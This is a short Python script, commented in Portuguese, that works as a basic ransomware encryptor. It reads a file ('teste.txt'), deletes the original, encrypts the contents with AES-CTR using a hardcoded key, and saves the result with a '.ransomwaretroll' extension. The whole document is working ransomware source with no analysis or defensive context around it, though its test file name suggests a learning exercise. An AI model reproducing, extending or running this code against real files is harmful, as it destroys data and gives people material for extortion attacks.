import os
import pyaes

# Função para criptografar um arquivo
def encrypt_file(input_file, encryption_key):
    # Abrir o arquivo que será criptografado
    with open(input_file, "rb") as file:
        file_content = file.read()
    
    # Remover o arquivo original
    os.remove(input_file)
    
    # Inicializar o objeto AES com a chave fornecida
    aes_cipher = pyaes.AESModeOfOperationCTR(encryption_key)
    
    # Criptografar os dados do arquivo
    encrypted_content = aes_cipher.encrypt(file_content)
    
    # Nome do novo arquivo criptografado
    encrypted_file_name = f"{input_file}.ransomwaretroll"
    
    # Salvar o arquivo criptografado
    with open(encrypted_file_name, "wb") as new_file:
        new_file.write(encrypted_content)

# Nome do arquivo a ser criptografado
file_to_encrypt = "teste.txt"
# Chave de criptografia
encryption_key = b"testeransomwares"

# Chamar a função de criptografia
encrypt_file(file_to_encrypt, encryption_key)
